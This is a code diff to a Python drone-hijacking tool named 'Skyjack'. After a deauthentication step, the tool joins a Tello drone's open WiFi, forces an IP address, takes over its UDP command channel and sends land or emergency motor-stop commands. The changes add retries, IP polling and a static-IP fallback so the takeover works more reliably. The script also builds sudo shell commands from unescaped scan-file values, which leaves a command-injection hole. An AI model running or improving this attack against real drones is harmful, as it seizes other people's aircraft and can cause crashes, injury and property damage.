@@ -3,8 +3,10 @@
 
 import os
 import json
+import re
 import time
 import socket
+import subprocess
 from src.utils import sudo_exec
 
 ##################
@@ -21,7 +23,8 @@ class Skyjack:
             scan_info = json.load(file)
 
         target_info = scan_info.get("target_info", {})
-        self.target_name = scan_info.get("target_name", "Unknown")
+        full_name = scan_info.get("target_name", "Unknown")
+        self.target_name = full_name.split(" ")[0] if " " in full_name else full_name
         self.target_mac = target_info.get("mac_address")
         self.target_channel = target_info.get("channel")
 
@@ -33,6 +36,7 @@ class Skyjack:
         self.tello_ip = "192.168.10.1"
         self.tello_port = 8889  # Command port
         self.local_port = 9000  # Local port to bind
+        self.local_ip = None
 
         # Connection state
         self.sock = None
@@ -97,18 +101,72 @@ class Skyjack:
             # Connect to TELLO's WiFi network
             # TELLO drones have open networks (no password)
             print(f"[CONNECT] Connecting to TELLO WiFi: {self.target_name}...")
-            sudo_exec(f"iw {self.interface} connect {self.target_name}")
+            result = sudo_exec(f"iw {self.interface} connect {self.target_name}")
+            
+            # Check if connection command succeeded
+            if result.returncode != 0:
+                print(f"[CONNECT] Error: iw connect failed with code {result.returncode}")
+                return False
 
             # Wait for connection
             time.sleep(2)
 
-            # Get IP address via DHCP
+            # Get IP address via DHCP with timeout
             print(f"[CONNECT] Requesting IP address via DHCP...")
-            sudo_exec(f"dhclient -v {self.interface}")
+            # -1 : Try once and exit (faster than persistent mode)
+            # -timeout 10 : Give up after 10 seconds
+            sudo_exec(f"timeout 10 dhclient -1 {self.interface}")
 
-            # Wait for DHCP
-            time.sleep(2)
-
+            # Poll for IP address using subprocess directly to capture output
+            print(f"[CONNECT] Verifying IP address...")
+            max_attempts = 6
+            for attempt in range(max_attempts):
+                # Use subprocess directly to capture output
+                result = subprocess.run(
+                    f"ip addr show {self.interface}",
+                    shell=True,
+                    capture_output=True,
+                    text=True
+                )
+                if result.returncode == 0 and "inet " in result.stdout:
+                    ip_match = re.search(r"inet\s+(\d+\.\d+\.\d+\.\d+)", result.stdout)
+                    if ip_match:
+                        self.local_ip = ip_match.group(1)
+                        print(f"[CONNECT] IP address obtained: {self.local_ip}")
+                        break
+                if attempt < max_attempts - 1:
+                    print(f"[CONNECT] Waiting for IP... attempt {attempt + 1}/{max_attempts}")
+                    time.sleep(1)  # Wait 1 second between checks
+            else:
+                print("[CONNECT] DHCP failed; applying static fallback 192.168.10.2/24")
+                try:
+                    fallback_ip = "192.168.10.2"
+                    sudo_exec(f"ip addr flush dev {self.interface}")
+                    sudo_exec(f"ip addr add {fallback_ip}/24 dev {self.interface}")
+                    sudo_exec(f"ip link set {self.interface} up")
+                    sudo_exec(f"ip route replace 192.168.10.0/24 dev {self.interface}")
+                    self.local_ip = fallback_ip
+                    print(f"[CONNECT] Static IP set: {self.local_ip}")
+                except Exception as e:
+                    print(f"[CONNECT] Error setting static IP: {e}")
+                    return False
+            
+            # Verify connectivity to drone with ping
+            print(f"[CONNECT] Testing connectivity to drone...")
+            ping_result = subprocess.run(
+                f"ping -c 2 -W 2 {self.tello_ip}",
+                shell=True,
+                capture_output=True,
+                text=True
+            )
+            
+            if ping_result.returncode != 0:
+                print(f"[CONNECT] Warning: Cannot ping drone at {self.tello_ip}")
+                print("[CONNECT] Waiting for network to stabilize...")
+                time.sleep(3)
+            else:
+                print("[CONNECT] Drone is reachable!")
+            
             print("[CONNECT] WiFi connection established!")
             return True
 
@@ -126,25 +184,36 @@ class Skyjack:
         print(f"\n[SDK] Initializing TELLO SDK connection...")
 
         try:
-            # Create UDP socket
+            if self.local_ip is None:
+                print("[SDK] Warning: Local IP unknown; commands may not reach the drone. Is WiFi connected?")
+
+            # Create UDP socket and bind to the interface IP if available
             self.sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-            self.sock.bind(('', self.local_port))
-            self.sock.settimeout(5.0)  # 5 second timeout
+            self.sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
+            bind_ip = self.local_ip if self.local_ip else ''
+            self.sock.bind((bind_ip, self.local_port))
+            self.sock.settimeout(10.0)  # 10 second timeout for initial connection
 
             print(f"[SDK] Socket bound to local port {self.local_port}")
             print(f"[SDK] Target: {self.tello_ip}:{self.tello_port}")
 
-            # Send 'command' to enter SDK mode
+            # Send 'command' to enter SDK mode with retry logic
             print("[SDK] Sending 'command' to enter SDK mode...")
-            response = self._send_command("command")
-
-            if response and response.lower() == "ok":
-                print("[SDK] TELLO SDK mode enabled!")
-                self.connected = True
-                return True
-            else:
-                print(f"[SDK] Unexpected response: {response}")
-                return False
+            max_retries = 3
+            for attempt in range(max_retries):
+                response = self._send_command("command", retries=2, retry_delay=1.0)
+                
+                if response and response.lower() == "ok":
+                    print("[SDK] TELLO SDK mode enabled!")
+                    self.connected = True
+                    self.sock.settimeout(5.0)  # Reduce timeout for normal operations
+                    return True
+                elif attempt < max_retries - 1:
+                    print(f"[SDK] Attempt {attempt + 1} failed, retrying...")
+                    time.sleep(1)
+            
+            print(f"[SDK] Failed to enter SDK mode after {max_retries} attempts")
+            return False
 
         except socket.timeout:
             print("[SDK] Timeout waiting for response. Drone may not be reachable.")
@@ -153,12 +222,14 @@ class Skyjack:
             print(f"[SDK] Error initializing SDK: {e}")
             return False
 
-    def _send_command(self, command: str) -> str | None:
+    def _send_command(self, command: str, retries: int = 1, retry_delay: float = 0.5) -> str | None:
         """
         Sends a command to the TELLO drone and waits for response.
         
         Args:
             command: The SDK command to send (e.g., 'command', 'takeoff', 'land')
+            retries: Number of attempts to send/receive before giving up
+            retry_delay: Seconds to wait between retries
             
         Returns: Response string from drone, or None on error.
         """
@@ -166,25 +237,29 @@ class Skyjack:
             print("[CMD] Error: Socket not initialized")
             return None
 
-        try:
-            # Send command
-            message = command.encode('utf-8')
-            self.sock.sendto(message, (self.tello_ip, self.tello_port))
-            print(f"[CMD] Sent: {command}")
+        for attempt in range(1, retries + 1):
+            try:
+                # Send command
+                message = command.encode('utf-8')
+                self.sock.sendto(message, (self.tello_ip, self.tello_port))
+                print(f"[CMD] Sent: {command} (attempt {attempt}/{retries})")
 
-            # Wait for response
-            response, _ = self.sock.recvfrom(1024)
-            response_str = response.decode('utf-8').strip()
-            print(f"[CMD] Received: {response_str}")
+                # Wait for response
+                response, _ = self.sock.recvfrom(1024)
+                response_str = response.decode('utf-8').strip()
+                print(f"[CMD] Received: {response_str}")
 
-            return response_str
+                return response_str
 
-        except socket.timeout:
-            print(f"[CMD] Timeout waiting for response to '{command}'")
-            return None
-        except Exception as e:
-            print(f"[CMD] Error sending command: {e}")
-            return None
+            except socket.timeout:
+                print(f"[CMD] Timeout waiting for response to '{command}' (attempt {attempt}/{retries})")
+            except Exception as e:
+                print(f"[CMD] Error sending command (attempt {attempt}/{retries}): {e}")
+
+            if attempt < retries:
+                time.sleep(retry_delay)
+
+        return None
 
     def land_drone(self) -> bool:
         """
@@ -198,7 +273,7 @@ class Skyjack:
             print("[LAND] Error: Not connected to drone SDK")
             return False
 
-        response = self._send_command("land")
+        response = self._send_command("land", retries=3, retry_delay=1.0)
 
         if response and response.lower() == "ok":
             print("[LAND] Drone is landing!")
@@ -220,7 +295,7 @@ class Skyjack:
             print("[EMERGENCY] Error: Not connected to drone SDK")
             return False
 
-        response = self._send_command("emergency")
+        response = self._send_command("emergency", retries=2, retry_delay=0.5)
 
         if response and response.lower() == "ok":
             print("[EMERGENCY] Motors stopped!")
@@ -238,7 +313,7 @@ class Skyjack:
         if not self.connected:
             return -1
 
-        response = self._send_command("battery?")
+        response = self._send_command("battery?", retries=2, retry_delay=0.5)
 
         if response is None:
             return -1
@@ -276,10 +351,6 @@ if __name__ == "__main__":
         print("[ABORT] Deauthentication failed. Exiting.")
         exit(1)
 
-    # Brief pause to let deauth take effect
-    print("\n[WAIT] Waiting for controller to disconnect...")
-    time.sleep(3)
-
     # Step 2: Connect to the drone's WiFi
     print("\n[STEP 2] Connecting to drone WiFi...")
     if not skyjack.connect_to_drone():
@@ -298,14 +369,36 @@ if __name__ == "__main__":
     battery = skyjack.get_battery()
     if battery >= 0:
         print(f"[STATUS] Battery: {battery}%")
-
-    # Step 5: Land the drone
-    print("\n[STEP 5] Landing the drone...")
-    if skyjack.land_drone():
-        print("\n[SUCCESS] Drone has been safely landed!")
+        
+        # Check for critical battery levels
+        if battery < 5:
+            print("[WARNING] Critical battery level! Drone may auto-land or already be grounded.")
+            print("[INFO] Skipping manual land command - drone likely on ground.")
+        elif battery < 15:
+            print("[WARNING] Low battery! Drone may auto-land soon.")
+            # Proceed with landing
+            print("\n[STEP 5] Landing the drone...")
+            if skyjack.land_drone():
+                print("\n[SUCCESS] Drone has been safely landed!")
+            else:
+                print("\n[WARNING] Land command may have failed. Trying emergency stop...")
+                skyjack.emergency_stop()
+        else:
+            # Normal battery level - proceed with landing
+            print("\n[STEP 5] Landing the drone...")
+            if skyjack.land_drone():
+                print("\n[SUCCESS] Drone has been safely landed!")
+            else:
+                print("\n[WARNING] Land command may have failed. Trying emergency stop...")
+                skyjack.emergency_stop()
     else:
-        print("\n[WARNING] Land command may have failed. Trying emergency stop...")
-        skyjack.emergency_stop()
+        print("[WARNING] Could not read battery level. Attempting to land anyway...")
+        print("\n[STEP 5] Landing the drone...")
+        if skyjack.land_drone():
+            print("\n[SUCCESS] Drone has been safely landed!")
+        else:
+            print("\n[WARNING] Land command may have failed. Trying emergency stop...")
+            skyjack.emergency_stop()
 
     # Cleanup
     skyjack.cleanup()
